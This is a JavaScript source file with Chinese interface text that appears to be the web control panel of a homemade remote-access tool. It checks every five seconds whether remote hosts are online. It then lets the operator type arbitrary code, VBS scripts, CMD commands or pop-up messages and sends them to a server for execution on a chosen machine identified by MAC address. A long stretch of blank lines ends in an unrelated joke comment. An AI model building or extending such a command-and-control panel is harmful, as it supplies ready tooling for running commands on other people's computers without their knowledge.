		c=0
		function ajax(mac){
			a=""
			var old=document.getElementById(mac).value;
			//alert(mac)
			document.getElementById("txt").value=c++;
			$.post("test.php?mode=ajax",{ipAddress:mac,amode:"online"},function(data,aaa){
				newval=cut(data,"[c]","[/c]");
				document.getElementById(mac).value=newval;
				var bt=document.getElementById(mac+"bt")
				if(old!=newval){
					bt.className="btn btn-success"
					bt.value="在线"
				}else{
					bt.className="btn btn-danger"
					bt.value="离线"
				}
				//alert(old+"\n"+newval)
				
				 
			 })
		}
		function cut(str,left,right){
			var start=str.indexOf(left)+left.length
			var end=str.indexOf(right)
			return str.substring(start,end)
		}
		
		var c=0
		var t
		function timer1(ip){
			ajax(ip);
		 //document.getElementById('txt').value=c
		
		 c++
		 t=setTimeout("timer1('"+ip+"')",5000)
		}
		
		function SendCode(btn,mac){
			if(btn.value=="在线"){
				var code=prompt("请输入执行的代码")
				//alert(mac)
				$.post("test.php?mode=ajax",{mac:mac,code:code,amode:"acode"},function(data,aaa){
					//alert(data)
				})
			}else{
				alert("主机未上线 无法操作")
			}
			
		}
		
		function VbsCode(btn,mac){
				var code=prompt("请输入VBS代码")
				//alert(mac)
				code="[vbs]"+code+"[/vbs]";
				$.post("test.php?mode=ajax",{mac:mac,code:code,amode:"acode"},function(data,aaa){
					alert(data)
				})
		}
		
		function CmdCode(btn,mac){
				var code=prompt("请输入CMD代码")
				//alert(mac)
				code="[cmd]"+code+"[/cmd]";
				$.post("test.php?mode=ajax",{mac:mac,code:code,amode:"acode"},function(data,aaa){
					alert(data)
				})
		}
		
		function MsgCode(btn,mac){
				var code=prompt("请输入要发送的信息")
				//alert(mac)
				code="[vbs]msgbox "+code+"[/vbs]";
				$.post("test.php?mode=ajax",{mac:mac,code:code,amode:"acode"},function(data,aaa){
					alert(data)
				})
		}
































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































		/*慌鸡的诗
			文盲
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		*/
		